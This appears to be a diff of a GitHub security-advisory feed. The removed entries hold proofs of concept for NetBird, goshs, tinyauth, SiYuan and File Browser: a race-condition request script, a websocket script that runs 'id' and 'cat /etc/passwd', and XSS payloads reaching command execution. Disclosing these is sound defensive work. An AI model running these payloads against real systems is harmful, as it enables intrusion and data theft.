+<p>No passwords of proxied data-sources are exposed. We encourage all direct data-sources to be converted to proxied data-sources as far as possible to improve your deployments' security.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27877">https://nvd.nist.gov/vuln/detail/CVE-2026-27877</a></li>
+<li><a href="https://grafana.com/security/security-advisories/cve-2026-27877">https://grafana.com/security/security-advisories/cve-2026-27877</a></li>
+<li><a href="https://github.com/advisories/GHSA-3q27-7qjq-p9c5">https://github.com/advisories/GHSA-3q27-7qjq-p9c5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3q27-7qjq-p9c5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-27T15:30:25.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/juju/juju] Juju has Improper TLS Client/Server authentication and certificate verification on Database Cluster]]></title>
         <id>https://github.com/advisories/GHSA-gvrj-cjch-728p</id>
@@ -1468,894 +1900,5 @@ if !safeModelRef.MatchString(u.ref) {
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-04-01T21:09:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/netbirdio/netbird] NetBird has Race Condition on UpdateUser Function, Resulting in Privilege Escalation From Admin to Owner]]></title>
-        <id>https://github.com/advisories/GHSA-rxmp-8h9v-56cx</id>
-        <link href="https://github.com/advisories/GHSA-rxmp-8h9v-56cx"/>
-        <updated>2026-04-01T21:03:01.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>A race condition vulnerability allows authenticated admin-privileged users to escalate to owner privilege.</p>
-<h2 id="details">Details</h2>
-<p>The vulnerability exists in the <code>updateUser</code> function, which is connected to the <code>/users/{userId}</code> PUT request. This function then calls the <code>SaveOrAddUsers</code> function, which checks the user's permissions on two separate occasions. The first check verifies whether the initiator is an admin or owner and rejects the request if the initiator is not. The second check retrieves the user role details from the database again and saves them in a variable called <code>initiatorUser</code>.</p>
-<h3 id="saveoraddusers-function"><code>SaveOrAddUsers</code> Function</h3>
-<p><strong>Location:</strong> <code>netbird/management/server/user.go</code> — Line 556</p>
-<p><img src="https://github.com/user-attachments/assets/821e79a2-ad3e-45d7-a952-daf5422c1801" alt="SaveOrAddUsers function code showing the two separate permission checks"></p>
-<p>Afterwards, the <code>validateUserUpdate</code> function is called, which checks if the initiator has permission to update that specific user's role. This validation is lacking, as it assumes the initiator is an admin or owner. In the case that the initiator is a regular user, these conditions do not apply, and the target can be updated to owner even when the initiator holds only a user role.</p>
-<h3 id="validateuserupdate-function"><code>validateUserUpdate</code> Function</h3>
-<p><strong>Location:</strong> <code>netbird/management/server/user.go</code> — Line 862</p>
-<p><img src="https://github.com/user-attachments/assets/a7e7f2df-ee4c-45b4-9b4d-c71c605dbaaa" alt="validateUserUpdate function code showing the insufficient permission validation logic"></p>
-<p>In summary, if the initiator's permission is <strong>admin</strong> at the first check and gets dropped to <strong>user</strong> at the second check, the initiator can update a user to <strong>owner</strong>.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p>It is possible to create the following attack:</p>
-<p>The initiator (<code>old_admin</code>) creates two different accounts — one with a <strong>user</strong> role and another with an <strong>admin</strong> role. These will be referred to as <code>new_user</code> and <code>new_admin</code> from here on.</p>
-<p>Two different requests are needed:</p>
-<ol>
-<li><strong>Request 1</strong> — Using <code>new_admin</code>'s JWT, a request is created that changes <code>old_admin</code>'s role to <strong>user</strong>.</li>
-<li><strong>Request 2</strong> — Using <code>old_admin</code>'s JWT, a request is created that changes <code>new_user</code>'s role to <strong>owner</strong>.</li>
-</ol>
-<p>Both requests need valid user IDs and <code>auto_groups</code> group IDs. They should be sent simultaneously without waiting for prior requests to return.</p>
-<p>There is a very small time gap between the first and second permission checks, so multiple tries and multiple copies of the requests may be needed. During a penetration test engagement, privilege escalation was achieved by using <strong>5 copies of Request 1</strong> and <strong>100 copies of Request 2</strong> without waiting for any request to complete. The request that updated the role to owner returned <strong>500</strong> status codes instead of <strong>403</strong>, which when retried returned <strong>200</strong> and successfully applied the update.</p>
-<p>The following Burp Suite race condition script was used. Note that it may still require multiple tries, and the <code>old_admin</code> account role must be reset to <strong>admin</strong> after every failed attempt.</p>
-<pre><code class="language-python">import time
-
-def queueRequests(target, wordlists):
-
-    engine = RequestEngine(
-        endpoint=target.endpoint,
-        concurrentConnections=100,
-        requestsPerConnection=100,
-        pipeline=False
-    )
-
-    # Request 1
-    req1 = """PUT /api/users/{OLD_ADMIN_USERID} HTTP/2
-Host: CHANGE_WITH_HOST
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
-Accept: application/json
-Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
-Accept-Encoding: gzip, deflate, br
-Content-Type: application/json
-Authorization: Bearer {NEW_ADMIN_TOKEN}
-Content-Length: 73
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Priority: u=0
-Te: trailers
-
-{"role":"user","auto_groups":[GROUP_ID],"is_blocked":false}"""
-
-    # Request 2
-    req2 = """PUT /api/users/{NEW_USER_USERID} HTTP/2
-Host: CHANGE_WITH_HOST
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
-Accept: application/json
-Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
-Accept-Encoding: gzip, deflate, br
-Content-Type: application/json
-Authorization: Bearer {OLD_ADMIN_TOKEN}
-Content-Length: 52
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Priority: u=0
-Te: trailers
-
-{"role":"owner","auto_groups":[],"is_blocked":false}"""
-
-    # Send first request
-    engine.queue(req1)
-    engine.queue(req1)
-    engine.queue(req1)
-    engine.queue(req1)
-    engine.queue(req1)
-
-    # Send second request
-    for i in range(100):
-        engine.queue(req2)
-
-
-def handleResponse(req, interesting):
-    table.add(req)
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An attacker with an admin account on the self-hosted NetBird management application <strong>v0.65.2 or lower</strong> can escalate to owner privileges.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/netbirdio/netbird/security/advisories/GHSA-rxmp-8h9v-56cx">https://github.com/netbirdio/netbird/security/advisories/GHSA-rxmp-8h9v-56cx</a></li>
-<li><a href="https://github.com/advisories/GHSA-rxmp-8h9v-56cx">https://github.com/advisories/GHSA-rxmp-8h9v-56cx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rxmp-8h9v-56cx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-01T21:03:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/patrickhener/goshs] goshs has Auth Bypass via Share Token]]></title>
-        <id>https://github.com/advisories/GHSA-jgfx-74g2-9r6g</id>
-        <link href="https://github.com/advisories/GHSA-jgfx-74g2-9r6g"/>
-        <updated>2026-04-01T20:58:51.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>When using the <code>Share Token</code> it is possible to bypass the limited selected file download with all the gosh functionalities, including code exec.</p>
-<h3 id="details">Details</h3>
-<p>The <code>BasicAuthMiddleware</code> checks for a <code>?token=</code> parameter <strong>before</strong> checking credentials. If the token exists in <code>SharedLinks</code>, the request passes through with <strong>no auth check at all</strong>. The handler then processes all query parameters — including <code>?ws</code> (WebSocket) which has higher priority than <code>?token</code>.</p>
-<pre><code class="language-go">// middleware.go:22-30 — token check runs FIRST
-token := r.URL.Query().Get("token")
-if token != "" {
-    _, ok := fs.SharedLinks[token]
-    if ok {
-        next.ServeHTTP(w, r)  // Full auth bypass
-        return
-    }
-}
-// ... normal auth checks never reached
-</code></pre>
-<p>A share token is designed for <strong>single-file, time-limited downloads</strong>. But the middleware bypass grants access to everything — directory listing, file deletion, clipboard, WebSocket, and CLI command execution.</p>
-<p><strong>1. Create a webroot:</strong></p>
-<pre><code class="language-bash">mkdir -p /tmp/goshs-webroot
-echo "shareable file" &gt; /tmp/goshs-webroot/shareable.txt
-</code></pre>
-<p><strong>2. Start goshs with auth + TLS + CLI mode:</strong></p>
-<pre><code class="language-bash">/tmp/goshs-test -d /tmp/goshs-webroot -b 'admin:password' -s -ss -c -p 8000
-</code></pre>
-<blockquote>
-<p>CLI mode requires auth (<code>-b</code>) and TLS (<code>-s -ss</code>). This is the documented usage — not a weakened config.</p>
-</blockquote>
-<p><strong>3. Verify authentication is required:</strong></p>
-<pre><code class="language-bash">curl -sk https://localhost:8000/
-Not authorized
-</code></pre>
-<p><strong>4. As a legitimate user, create a share link:</strong></p>
-<pre><code class="language-bash">curl -sk -u admin:password 'https://localhost:8000/shareable.txt?share'
-</code></pre>
-<p>Response:</p>
-<pre><code class="language-json">{"urls":["https://127.0.0.1:8000/shareable.txt?token=gMP-w0hXRs-Q-FEZku63kA"]}
-</code></pre>
-<p>Save the token value (e.g., <code>gMP-w0hXRs-Q-FEZku63kA</code>).</p>
-<p><strong>5. Prove the token bypasses auth for WebSocket:</strong></p>
-<pre><code class="language-bash"># Without token → 401 (blocked)
-curl -sk -o /dev/null -w "%{http_code}" \
-  -H "Connection: Upgrade" -H "Upgrade: websocket" \
-  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
-  'https://localhost:8000/?ws'
-# 401
-
-# With token → 101 Switching Protocols (auth bypassed!)
-curl -sk -o /dev/null -w "%{http_code}" \
-  -H "Connection: Upgrade" -H "Upgrade: websocket" \
-  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
-  'https://localhost:8000/?ws&amp;token=gMP-w0hXRs-Q-FEZku63kA'
-# 101
-</code></pre>
-<p>For a Full PoC, you can run the python file attached below, it will run <code>id</code> and <code>cat /etc/passwd</code>.</p>
-<h3 id="poc">PoC</h3>
-<pre><code class="language-python">import json, ssl, websocket
-
-TOKEN = "gMP-w0hXRs-Q-FEZku63kA"  # ← replace with your token
-
-ws = websocket.create_connection(
-    f"wss://localhost:8000/?ws&amp;token={TOKEN}",
-    sslopt={"cert_reqs": ssl.CERT_NONE},
-)
-print("[+] Connected WITHOUT credentials!")
-
-# Execute 'id'
-ws.send('{"type":"command","Content":"id"}')
-import time; time.sleep(1)
-resp = json.loads(ws.recv())
-print(f"Output: {resp['content']}")
-# uid=501(youruser) gid=20(staff) ...
-
-# Execute 'cat /etc/passwd'
-ws.send('{"type":"command","Content":"cat /etc/passwd"}')
-time.sleep(1)
-resp = json.loads(ws.recv())
-print(f"Output: {resp['content']}")
-
-ws.close()
-</code></pre>
-<p>A patch is available at <a href="https://github.com/patrickhener/goshs/releases/tag/v2.0.0-beta.2">https://github.com/patrickhener/goshs/releases/tag/v2.0.0-beta.2</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/patrickhener/goshs/security/advisories/GHSA-jgfx-74g2-9r6g">https://github.com/patrickhener/goshs/security/advisories/GHSA-jgfx-74g2-9r6g</a></li>
-<li><a href="https://github.com/advisories/GHSA-jgfx-74g2-9r6g">https://github.com/advisories/GHSA-jgfx-74g2-9r6g</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jgfx-74g2-9r6g</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-01T20:58:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/steveiliop56/tinyauth] Tinyauth has OAuth account confusion via shared mutable state on singleton service instances]]></title>
-        <id>https://github.com/advisories/GHSA-9q5m-jfc4-wc92</id>
-        <link href="https://github.com/advisories/GHSA-9q5m-jfc4-wc92"/>
-        <updated>2026-04-01T19:52:05.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>All three OAuth service implementations (<code>GenericOAuthService</code>, <code>GithubOAuthService</code>, <code>GoogleOAuthService</code>) store PKCE verifiers and access tokens as mutable struct fields on singleton instances shared across all concurrent requests. When two users initiate OAuth login for the same provider concurrently, a race condition between <code>VerifyCode()</code> and <code>Userinfo()</code> causes one user to receive a session with the other user's identity.</p>
-<h3 id="details">Details</h3>
-<p>The <a href="https://github.com/steveiliop56/tinyauth/blob/592b7ded24959013f8af63ab9930254c752c8c8e/internal/service/oauth_broker_service.go#L70-L72"><code>OAuthBrokerService.GetService()</code></a> returns a single shared instance per provider for every request. The OAuth flow stores intermediate state as struct fields on this singleton:</p>
-<p><strong>Token storage</strong> — <a href="https://github.com/steveiliop56/tinyauth/blob/592b7ded24959013f8af63ab9930254c752c8c8e/internal/service/generic_oauth_service.go#L96"><code>generic_oauth_service.go</code> line 96</a>:</p>
-<pre><code class="language-go">generic.token = token  // Shared mutable field on singleton
-</code></pre>
-<p><strong>Verifier storage</strong> — <a href="https://github.com/steveiliop56/tinyauth/blob/592b7ded24959013f8af63ab9930254c752c8c8e/internal/service/generic_oauth_service.go#L81"><code>generic_oauth_service.go</code> line 81</a>:</p>
-<pre><code class="language-go">generic.verifier = verifier  // Shared mutable field on singleton
-</code></pre>
-<p>In the callback handler <a href="https://github.com/steveiliop56/tinyauth/blob/592b7ded24959013f8af63ab9930254c752c8c8e/internal/controller/oauth_controller.go#L136-L143"><code>oauth_controller.go</code> lines 136–143</a>, the code calls:</p>
-<pre><code class="language-go">err = service.VerifyCode(code)                       // line 136 — stores token on singleton
-// ... race window ...
-user, err := controller.broker.GetUser(req.Provider)  // line 143 — reads token from singleton
-</code></pre>
-<p>Between these two calls, a concurrent request's <code>VerifyCode()</code> can overwrite the <code>token</code> field, causing <code>GetUser()</code> → <code>Userinfo()</code> to fetch the <strong>wrong user's</strong> identity claims.</p>
-<p>The same pattern exists in all three implementations:</p>
-<ul>
-<li><a href="https://github.com/steveiliop56/tinyauth/blob/592b7ded24959013f8af63ab9930254c752c8c8e/internal/service/github_oauth_service.go#L34-L39"><code>github_oauth_service.go</code> lines 34–39, 77, 86–99</a></li>
-<li><a href="https://github.com/steveiliop56/tinyauth/blob/592b7ded24959013f8af63ab9930254c752c8c8e/internal/service/google_oauth_service.go#L22-L27"><code>google_oauth_service.go</code> lines 22–27, 65, 73–87</a></li>
-</ul>
-<h3 id="poc">PoC</h3>
-<p><strong>Race scenario</strong> (two concurrent OAuth callbacks):</p>
-<ol>
-<li>User A and User B both click "Login with GitHub" on the same tinyauth instance</li>
-<li>Both are redirected to GitHub, authorize, and GitHub redirects both back with authorization codes</li>
-<li>Both callbacks arrive at tinyauth nearly simultaneously:</li>
-</ol>
-<pre><code>Timeline:
-  t0: Request A → service.VerifyCode(codeA) → singleton.token = tokenA
-  t1: Request B → service.VerifyCode(codeB) → singleton.token = tokenB  (overwrites tokenA)
-  t2: Request A → broker.GetUser("github")  → Userinfo() reads singleton.token = tokenB
-  t3: Request A receives User B's identity (email, name, groups)
-</code></pre>
-<p>User A now has a tinyauth session with User B's email, gaining access to all resources User B is authorized for via tinyauth's ACL.</p>
-<p><strong>PKCE verifier DoS variant</strong>: Even with PKCE, concurrent <code>oauthURLHandler</code> calls overwrite the <code>verifier</code> field, causing <code>VerifyCode()</code> to send the wrong verifier to the OAuth provider, which rejects the exchange.</p>
-<p><strong>Static verification</strong>: Run Go's race detector on a test that calls <code>VerifyCode</code> and <code>Userinfo</code> concurrently on the same service instance — the <code>-race</code> flag will flag data races on the <code>token</code> and <code>verifier</code> fields.</p>
-<p><strong>Go race detector confirmation</strong>: Running a concurrent test with <code>go test -race</code> on the singleton service detects <strong>4 data races</strong> on the <code>token</code> and <code>verifier</code> fields. Without the race detector, measured token overwrite rate is 99.9% (9,985/10,000 iterations).</p>
-<p><strong>Test environment</strong>: tinyauth v5.0.4, commit <code>592b7ded</code>, Go race detector + source code analysis</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker who times their OAuth callback to race with a victim's callback can obtain a tinyauth session with the victim's identity. This grants unauthorized access to all resources the victim is permitted to access through tinyauth's ACL system. The probability of collision increases with concurrent OAuth traffic.</p>
-<p>The PKCE verifier overwrite additionally causes a denial-of-service: concurrent OAuth logins for the same provider reliably fail.</p>
-<h3 id="suggested-fix">Suggested Fix</h3>
-<p>Pass verifier and token through method parameters or return values instead of storing them on the singleton:</p>
-<pre><code class="language-go">func (generic *GenericOAuthService) VerifyCode(code string, verifier string) (*oauth2.Token, error) {
-    return generic.config.Exchange(generic.context, code, oauth2.VerifierOption(verifier))
-}
-
-func (generic *GenericOAuthService) Userinfo(token *oauth2.Token) (config.Claims, error) {
-    client := generic.config.Client(generic.context, token)
-    // ...
-}
-</code></pre>
-<p>Store the PKCE verifier in the session/cookie associated with the OAuth <code>state</code> parameter, not on the service struct.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/steveiliop56/tinyauth/security/advisories/GHSA-9q5m-jfc4-wc92">https://github.com/steveiliop56/tinyauth/security/advisories/GHSA-9q5m-jfc4-wc92</a></li>
-<li><a href="https://github.com/advisories/GHSA-9q5m-jfc4-wc92">https://github.com/advisories/GHSA-9q5m-jfc4-wc92</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9q5m-jfc4-wc92</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-01T19:52:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan vulnerable to reflected XSS via SVG namespace prefix bypass in SanitizeSVG (getDynamicIcon, unauthenticated)]]></title>
-        <id>https://github.com/advisories/GHSA-73g7-86qr-jrg3</id>
-        <link href="https://github.com/advisories/GHSA-73g7-86qr-jrg3"/>
-        <updated>2026-04-01T00:30:03.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The <code>SanitizeSVG</code> function introduced in v3.6.0 to fix XSS in the unauthenticated <code>/api/icon/getDynamicIcon</code> endpoint can be bypassed by using namespace-prefixed element names such as <code>&lt;x:script xmlns:x="http://www.w3.org/2000/svg"&gt;</code>. The Go HTML5 parser records the element's tag as <code>"x:script"</code> rather than <code>"script"</code>, so the tag check passes it through. The SVG is served with <code>Content-Type: image/svg+xml</code> and no Content Security Policy; when a browser opens the response directly, its XML parser resolves the prefix to the SVG namespace and executes the embedded script.</p>
-<h3 id="details">Details</h3>
-<p>The <code>getDynamicIcon</code> route is registered without authentication:</p>
-<pre><code class="language-go">// kernel/server/serve.go
-ginServer.Handle("GET", "/api/icon/getDynamicIcon", getDynamicIcon)
-</code></pre>
-<p>For type 8, the <code>content</code> query parameter is inserted directly into an SVG <code>&lt;text&gt;</code> element using <code>fmt.Sprintf</code> with no HTML encoding:</p>
-<pre><code class="language-go">// kernel/api/icon.go:579-584
-return fmt.Sprintf(`
-    &lt;svg id="dynamic_icon_type8" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"&gt;
-        &lt;path d="..."/&gt;
-        &lt;text x="50%%" y="55%%" ...&gt;%s&lt;/text&gt;
-    &lt;/svg&gt;`, ..., content)
-</code></pre>
-<p><code>SanitizeSVG</code> then parses the SVG with <code>github.com/88250/lute/html</code> and removes elements whose lowercased tag name matches a fixed list:</p>
-<pre><code class="language-go">// kernel/util/misc.go:249-252
-tag := strings.ToLower(c.Data)
-if tag == "script" || tag == "iframe" || tag == "object" || tag == "embed" ||
-    tag == "foreignobject" || "animate" == tag || ... {
-    n.RemoveChild(c)
-</code></pre>
-<p>The lute HTML parser stores the full qualified name including any namespace prefix in <code>Node.Data</code>. A payload like <code>&lt;x:script xmlns:x="http://www.w3.org/2000/svg"&gt;</code> gets <code>Data = "x:script"</code>. The check <code>tag == "script"</code> is false, so the element is not removed and survives in the rendered output.</p>
-<p>Confirmed with the same library version used by SiYuan:</p>
-<pre><code>html.Parse input:  &lt;x:script xmlns:x="http://www.w3.org/2000/svg"&gt;alert(1)&lt;/x:script&gt;
-Node.Data result:  "x:script"   (not "script")
-Removed by check:  false
-Rendered output:   &lt;x:script xmlns:x="http://www.w3.org/2000/svg"&gt;alert(1)&lt;/x:script&gt;
-</code></pre>
-<p>The same bypass works for every element on the blocklist: <code>x:iframe</code>, <code>x:object</code>, <code>x:foreignObject</code>, etc.</p>
-<p>The fix is to strip the namespace prefix before comparing:</p>
-<pre><code class="language-go">localName := tag
-if i := strings.LastIndex(tag, ":"); i &gt;= 0 {
-    localName = tag[i+1:]
-}
-if localName == "script" || localName == "iframe" || ...
-</code></pre>
-<h3 id="poc">PoC</h3>
-<pre><code>GET /api/icon/getDynamicIcon?type=8&amp;color=red&amp;content=%3C%2Ftext%3E%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E%3Ctext%3E HTTP/1.1
-Host: 127.0.0.1:6806
-</code></pre>
-<p>Decoded <code>content</code> value:</p>
-<pre><code>&lt;/text&gt;&lt;x:script xmlns:x="http://www.w3.org/2000/svg"&gt;alert(document.domain)&lt;/x:script&gt;&lt;text&gt;
-</code></pre>
-<p>The response is a valid SVG with the script element intact. Opening the URL directly in a browser triggers the alert, confirming script execution at the SiYuan server origin.</p>
-<h3 id="impact">Impact</h3>
-<p>Any user whose SiYuan instance is reachable over a local network is exposed. An attacker on the same network can craft the URL and share it. When the victim opens it in a browser, JavaScript executes at the <code>http://&lt;siyuan-host&gt;:6806</code> origin. Because SiYuan sets <code>Access-Control-Allow-Origin: *</code> and the script runs same-origin, it can call any API endpoint using the victim's existing session cookies, including endpoints to read all notes, export data, or modify settings. No authentication or prior access is needed to construct the payload.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-73g7-86qr-jrg3">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-73g7-86qr-jrg3</a></li>
-<li><a href="https://github.com/siyuan-note/siyuan/issues/17246">https://github.com/siyuan-note/siyuan/issues/17246</a></li>
-<li><a href="https://github.com/siyuan-note/siyuan/releases/tag/v3.6.2">https://github.com/siyuan-note/siyuan/releases/tag/v3.6.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-73g7-86qr-jrg3">https://github.com/advisories/GHSA-73g7-86qr-jrg3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-73g7-86qr-jrg3</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-01T00:30:01.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan Desktop: Stored XSS in imported .sy.zip content leads to arbitrary command execution]]></title>
-        <id>https://github.com/advisories/GHSA-ff66-236v-p4fg</id>
-        <link href="https://github.com/advisories/GHSA-ff66-236v-p4fg"/>
-        <updated>2026-04-01T00:05:12.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A vulnerability allows crafted block attribute values to bypass server-side attribute escaping when an HTML entity is mixed with raw special characters. An attacker can embed a malicious IAL value inside a <code>.sy</code> document, package it as a <code>.sy.zip</code>, and have the victim import it through the normal <code>Import -&gt; SiYuan .sy.zip</code> workflow. Once the note is opened, the malicious attribute breaks out of its original HTML context and injects an event handler, resulting in stored XSS. In the Electron desktop client, this XSS reaches remote code execution because injected JavaScript runs with access to Node/Electron APIs.</p>
-<h3 id="details">Details</h3>
-<p>The issue is caused by a logic regression in <code>escapeNodeAttributeValues</code> in <code>kernel/filesys/tree.go</code>.
-Previously, the escaping logic converted <code>node.KramdownIAL</code> with <code>parse.IAL2Map(...)</code> before deciding whether a value needed escaping. That conversion unescaped existing entities first, so mixed values such as:</p>
-<pre><code>&amp;amp;" onmouseenter="alert('IAL-XSS')
-</code></pre>
-<p>were still recognized as unsafe and escaped correctly.
-The logic changed to inspect raw <code>KramdownIAL</code> values directly. The new <code>needsEscapeForValue</code> implementation returns <code>false</code> as soon as it sees any known entity such as <code>&amp;amp;</code>, <code>&amp;quot;</code>, <code>&amp;lt;</code>, or <code>&amp;gt;</code>. This means a value containing both an entity and an unescaped raw quote bypasses escaping entirely.</p>
-<p>That bypass becomes exploitable because the renderer later inserts block IAL values directly into HTML attributes. A payload like:</p>
-<pre><code>&amp;amp;" onmouseenter="require('child_process').exec('calc')
-</code></pre>
-<p>can be rendered into HTML equivalent to:</p>
-<pre><code>&lt;div title="&amp;amp;" onmouseenter="require('child_process').exec('calc')"&gt;
-</code></pre>
-<p>This creates a stored XSS condition. In SiYuan Desktop, the Electron renderer runs with Node.js integration available, so attacker-controlled JavaScript can invoke Node APIs directly. As a result, the issue is not limited to script execution in the page context and becomes arbitrary command execution on the victim’s machine.</p>
-<p>The stored XSS path was validated by importing a crafted <code>.sy.zip</code> through the normal GUI and triggering JavaScript execution from the rendered block. Because the same injected JavaScript runs in the privileged Electron renderer, this is an RCE issue in the desktop client.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Start SiYuan Desktop <code>v3.6.1</code>.</li>
-<li>Prepare a crafted <code>.sy.zip</code> containing a .sy document with a block IAL property such as:</li>
-</ol>
-<pre><code>"title": "&amp;amp;\" onmouseenter=\"require('child_process').exec('calc')"
-</code></pre>
-<ol start="3">
-<li>In the UI, right-click any notebook.</li>
-<li>Select <code>Import -&gt; SiYuan .sy.zip</code>.</li>
-<li>Import the crafted archive.</li>
-<li>Open the imported note.</li>
-<li>Move the mouse over the affected paragraph block.</li>
-<li>Observe that the injected JavaScript executes.</li>
-<li>On Windows, <code>calc.exe</code> launches, demonstrating arbitrary command execution.</li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>This vulnerability allows an attacker to deliver a malicious <code>.sy.zip</code> file that executes attacker-controlled JavaScript after import. In the desktop application, that JavaScript runs with Node/Electron privileges and can execute arbitrary operating system commands under the victim’s account. This makes the bug equivalent to local code execution triggered by importing and opening attacker-supplied content.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-ff66-236v-p4fg">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-ff66-236v-p4fg</a></li>
-<li><a href="https://github.com/siyuan-note/siyuan/commit/918d1bd9f967d888f474f6764744a3d8cca4a501">https://github.com/siyuan-note/siyuan/commit/918d1bd9f967d888f474f6764744a3d8cca4a501</a></li>
-<li><a href="https://github.com/siyuan-note/siyuan/releases/tag/v3.6.2">https://github.com/siyuan-note/siyuan/releases/tag/v3.6.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-ff66-236v-p4fg">https://github.com/advisories/GHSA-ff66-236v-p4fg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-ff66-236v-p4fg</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-01T00:05:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser vulnerable to Stored Cross-site Scripting via text/template branding injection]]></title>
-        <id>https://github.com/advisories/GHSA-xfqj-3vmx-63wv</id>
-        <link href="https://github.com/advisories/GHSA-xfqj-3vmx-63wv"/>
-        <updated>2026-03-31T23:45:58.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The SPA index page in File Browser is vulnerable to Stored Cross-site Scripting (XSS) via admin-controlled branding fields. An admin who sets <code>branding.name</code> to a malicious payload injects persistent JavaScript that executes for ALL visitors, including unauthenticated users.</p>
-<br>
-
-<h3 id="details">Details</h3>
-<p><code>http/static.go</code> renders the SPA <code>index.html</code> using Go's <code>text/template</code> (NOT <code>html/template</code>) with custom delimiters <code>[{[</code> and <code>]}]</code>. Branding fields are inserted directly into HTML without any escaping:</p>
-<pre><code class="language-go">// http/static.go, line 16 — imports text/template instead of html/template
-"text/template"
-
-// http/static.go, line 33 — branding.Name passed into template data
-"Name": d.settings.Branding.Name,
-
-// http/static.go, line 97 — template parsed with custom delimiters, no escaping
-index := template.Must(template.New("index").Delims("[{[", "]}]").Parse(string(fileContents)))
-</code></pre>
-<p>The frontend template (<code>frontend/public/index.html</code>) embeds these fields directly:</p>
-<pre><code class="language-html">&lt;!-- frontend/public/index.html, line 16 --&gt;
-[{[ if .Name -]}][{[ .Name ]}][{[ else ]}]File Browser[{[ end ]}]
-
-&lt;!-- frontend/public/index.html, line 42 --&gt;
-content="[{[ if .Color -]}][{[ .Color ]}][{[ else ]}]#2979ff[{[ end ]}]"
-</code></pre>
-<p>Since <code>text/template</code> performs NO HTML escaping (unlike <code>html/template</code>), setting <code>branding.name</code> to <code>&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> breaks out of the <code>&lt;title&gt;</code> tag and injects arbitrary script into every page load.</p>
-<p>Additionally, when ReCaptcha is enabled, the <code>ReCaptchaHost</code> field is used as:</p>
-<pre><code class="language-html">&lt;script src="[{[.ReCaptchaHost]}]/recaptcha/api.js"&gt;&lt;/script&gt;
-</code></pre>
-<p>This allows loading arbitrary JavaScript from an admin-chosen origin.</p>
